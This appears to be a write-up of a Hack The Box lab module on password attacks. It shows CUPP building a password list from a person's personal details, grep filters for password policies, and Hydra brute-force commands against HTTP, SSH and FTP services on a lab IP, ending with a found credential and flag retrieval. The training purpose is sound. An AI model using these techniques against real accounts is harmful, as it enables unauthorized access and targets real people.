## Password Generation with CUPP
CUPP (Common User Passwords Profiler) creates personalized password wordlists based on gathered intelligence. The more information you provide, the more effective the list.

### Installing CUPP
```bash
DJMC@htb[/htb]$ sudo apt install cupp -y
```

### Example Profile for Jane Smith
| Field                   | Details             |
|-------------------------|---------------------|
| Name                   | Jane Smith          |
| Nickname               | Janey               |
| Birthdate              | December 11, 1990  |
| Partner’s Name         | Jim (Nickname: Jimbo)|
| Partner’s Birthdate    | December 12, 1990  |
| Pet                   | Spot                |
| Company               | AHI                 |
| Interests              | Hackers, Pizza, Golf|
| Favorite Colors        | Blue                |

Run CUPP interactively:
```bash
DJMC@htb[/htb]$ cupp -i
```
Answer the prompts with details about Jane Smith. CUPP will generate a comprehensive password list (`jane.txt`) including:
- Variations: `jane1990`, `smith2708`
- Leetspeak: `j4n3`, `5m1th`
- Mutations: `Jane1990!`, `smith2708@`

### Filtering Passwords to Match Policies
If Jane's company has a password policy, filter the list to match:
- Minimum 6 characters
- At least one uppercase, lowercase, number, and two special characters (!@#$%^&*)

```bash
DJMC@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

---

## Combining Wordlists with Hydra
Use the generated username and password lists in Hydra:
```bash
DJMC@htb[/htb]$ hydra -L jane_smith_usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
```

### Example Output
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak
...
[PORT][http-post-form] host: IP   login: Jane.Smith   password: P@ssw0rd! [SUCCESS]
...
1 of 1 target successfully completed, 1 valid password found
```

Log into the system with the discovered credentials and retrieve the flag.

---

## Summary
Custom wordlists dramatically improve brute-force efficiency by tailoring lists to the target:
1. **Username Anarchy**: Generates diverse username combinations.
2. **CUPP**: Creates highly targeted password lists based on personal information.
3. **Filtering**: Refines lists to meet specific password policies.
4. **Hydra**: Executes attacks using the tailored wordlists.

This approach underscores the importance of strong, unique authentication practices to protect against brute-force attacks.

---

# Skills Assessment

## Part 1: Basic Auth Login
**Objective:** Find the password for the basic authentication login.

### Steps:
1. Use Hydra to perform a brute-force attack on the HTTP service running on port `55023`.
    ```bash
    hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt 83.136.253.216 http-get / -s 55023
    ```

### Outcome:
The password for the basic auth login is discovered.

---

## Part 2: FTP User and Flag Extraction
**Objective:** Identify the username for the FTP service and retrieve the flag.

### Steps:
1. Perform a brute-force attack on the SSH service to confirm access:
    ```bash
    hydra -s 44625 -l satwossh -P 2023-200_most_used_passwords.txt ssh://83.136.253.216 -t 5
    ```

2. Use the discovered SSH credentials to log in and extract potential usernames:
    ```bash
    ssh satwossh@83.136.253.216 -p 44625 ./username-anarchy Thomas Smith > thomas_smith_usernames.txt
    ```

3. Perform a brute-force attack on the FTP service using the extracted usernames:
    ```bash
    hydra -L thomas_smith_usernames.txt -P ../passwords.txt ftp://127.0.0.1
    ```

4. Log in to the FTP service using the valid credentials:
    ```bash
    ftp 'ftp://thomas:chocolate!@localhost'
    ```

5. Navigate and retrieve the flag:
    ```bash
    ls
    get flag.txt
    exit
    ```

6. Read the contents of the flag:
    ```bash
    cat flag.txt
    ```

### Outcome:
The flag is successfully retrieved and its contents are revealed.

    
